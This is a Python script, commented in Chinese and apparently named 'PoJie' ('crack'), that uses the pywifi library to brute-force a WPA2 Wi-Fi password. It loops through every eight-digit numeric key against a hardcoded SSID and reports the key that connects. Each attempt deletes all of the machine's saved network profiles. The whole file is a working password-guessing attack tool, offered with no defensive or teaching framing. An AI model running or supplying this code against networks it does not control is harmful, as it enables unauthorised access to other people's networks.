import time  #时间

import pywifi #破解wifi

from pywifi import const #引用定义

from asyncio.tasks import sleep

class PoJie():
	def __init__(self,path):
		self.file = open(path,"r",errors = "ignore")
		wifi = pywifi.PyWiFi()#抓取网卡接口
		self.iface = wifi.interfaces()[0]#抓取第一个无线网卡
		self.iface.disconnect()#测试链接断开所有链接
		time.sleep(1) #休眠1秒
		#测试网卡是否属于断开状态
		#assert self.iface.status() in [const.IFACE_DISCONNECTED,const.IFACE_INACTIVE]
	
	def readPassword(self):
		print("开始破解:")
		password = 0;
		
		while True:
			try:
				# myStr = self.file.readline().strip()
				# if not myStr:
					# break
				pa = str(password).zfill(8)
				bool1 = self.test_connect(pa)
				if bool1:
					print("密码正确:",pa)
					break
				else:
					print("密码错误"+pa)
				if(pa=='99999999'):
				    break;
				password += 1;
			except:
				continue
		
	def test_connect(self,findStr):#测试连接
		profile    = pywifi.Profile() #创建wifi链接文件
		#profile.ssid = "不知道叫啥。" #wifi名称
		profile.ssid = "12344321" #wifi名称
		profile.auth = const.AUTH_ALG_OPEN #网卡的开放
		profile.akm.append(const.AKM_TYPE_WPA2PSK)#wifi加密算法
		profile.cipher = const.CIPHER_TYPE_CCMP  #加密单元
		profile.key = findStr #密码
		self.iface.remove_all_network_profiles()#删除所有的wifi文件
		tmp_profile = self.iface.add_network_profile(profile)#设定新的链接文件
		self.iface.connect(tmp_profile)#链接
		time.sleep(5)
		if self.iface.status() == const.IFACE_CONNECTED:#判断是否链接上
			isOK = True
		else:
			isOK = False
		self.iface.disconnect()#断开
		time.sleep(1)
		#检查断开状态
		assert self.iface.status() in [const.IFACE_DISCONNECTED,const.IFACE_INACTIVE]
		return isOK
	
	def __del__(self):
		self.file.close()

def main():
	path = r"keys.txt"
	start = PoJie(path)
	start.readPassword()
	
if __name__ == "__main__":
	main();